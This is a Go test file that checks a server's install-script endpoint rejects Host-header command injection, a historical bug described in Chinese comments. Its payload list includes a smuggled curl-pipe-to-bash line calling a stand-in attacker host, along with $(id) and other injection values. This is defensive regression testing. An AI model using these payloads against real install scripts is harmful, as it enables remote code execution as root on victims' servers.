package master

import (
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"work-v/internal/master/model"
)

// setupTestDB 初始化独立数据库, 结束时关闭连接, 避免 Windows 上临时目录残留
func setupTestDB(t *testing.T, name string) {
	t.Helper()
	dir, err := os.MkdirTemp("", "workv-master-test-*")
	if err != nil {
		t.Fatalf("MkdirTemp: %v", err)
	}
	t.Cleanup(func() {
		if model.DB != nil {
			if sqlDB, err := model.DB.DB(); err == nil {
				_ = sqlDB.Close()
			}
			model.DB = nil
		}
		_ = os.RemoveAll(dir)
	})
	if _, err := model.InitDB(filepath.Join(dir, name)); err != nil {
		t.Fatalf("InitDB: %v", err)
	}
}

func requestInstallScript(t *testing.T, host string) *httptest.ResponseRecorder {
	t.Helper()
	if model.DB == nil {
		setupTestDB(t, "install.db")
	}
	r := SetupRouter(nil)
	req := httptest.NewRequest("GET", "/install.sh", nil)
	req.Host = host
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	return w
}

// 历史缺陷: Host 头未经校验就 sprintf 进即将被 root 执行的安装脚本,
// 且使用 ReplaceAllString (把 $1/${x} 当捕获组), 可注入任意命令。
func TestInstallScriptRejectsHostHeaderInjection(t *testing.T) {
	payloads := []string{
		`evil.com";curl -fsSL http://attacker.tld/p|bash;#`,
		`evil.com$(id)`,
		`evil.com x`,
		`evil.com/../../etc`,
		`evil.com:99999`,
		``,
	}
	for _, host := range payloads {
		t.Run(host, func(t *testing.T) {
			w := requestInstallScript(t, host)
			if w.Code != 400 {
				t.Fatalf("恶意 Host %q 未被拒绝: status=%d", host, w.Code)
			}
			if strings.Contains(w.Body.String(), "attacker.tld") {
				t.Errorf("恶意内容进入了响应体")
			}
		})
	}
}

func TestInstallScriptAcceptsValidHost(t *testing.T) {
	for _, host := range []string{"panel.example.com", "127.0.0.1:8080", "[::1]:8080"} {
		t.Run(host, func(t *testing.T) {
			w := requestInstallScript(t, host)
			if w.Code != 200 {
				t.Fatalf("合法 Host %q 被拒绝: status=%d", host, w.Code)
			}
			body := w.Body.String()
			idx := strings.Index(body, "DEFAULT_SERVER=")
			if idx < 0 {
				t.Fatalf("安装脚本缺少 DEFAULT_SERVER")
			}
			line := body[idx:]
			end := strings.Index(line, "\n")
			if end < 0 {
				end = len(line)
			}
			if !strings.Contains(line[:end], host) {
				t.Errorf("DEFAULT_SERVER 未指向请求 Host: %s", line[:80])
			}
		})
	}
}

func TestSanitizeHost(t *testing.T) {
	good := map[string]string{
		"panel.example.com": "panel.example.com",
		"1.2.3.4:8080":      "1.2.3.4:8080",
	}
	for in, want := range good {
		got, ok := sanitizeHost(in)
		if !ok || got != want {
			t.Errorf("sanitizeHost(%q) = %q,%v; 期望 %q,true", in, got, ok, want)
		}
	}
	bad := []string{`a";id`, "a b", "a$b", "a;b", "a/b", "a:b:c", ""}
	for _, in := range bad {
		if _, ok := sanitizeHost(in); ok {
			t.Errorf("sanitizeHost(%q) 应当被拒绝", in)
		}
	}
}
